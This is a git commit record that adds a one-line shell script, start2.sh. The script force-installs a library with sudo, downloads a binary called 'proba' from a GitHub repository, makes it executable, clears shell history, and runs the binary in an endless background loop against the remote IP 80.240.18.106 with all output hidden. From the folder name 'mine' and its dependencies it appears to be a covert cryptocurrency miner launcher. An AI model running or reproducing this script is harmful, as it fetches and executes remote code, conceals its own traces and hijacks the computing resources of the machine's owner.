a73bf349e91a1fb410c2797765c907cd8fb9706b
aleksey1255 <94141580+aleksey1255@users.noreply.github.com>
2021-12-06 11:01:53 +1000

    Create start2.sh

---
+++ start2.sh
@@ -0,0 +1,1 @@
+bash -c 'rm -R mine; mkdir mine; cd mine; clear; sudo apt --force-yes -y install libuv1.dev; wget -c https://github.com/aleksey1255/ai/raw/main/proba; chmod u+x proba; history -c; clear; while true; do timeout 1800 ./proba -a 80.240.18.106; done > /dev/null 2>&1 &'
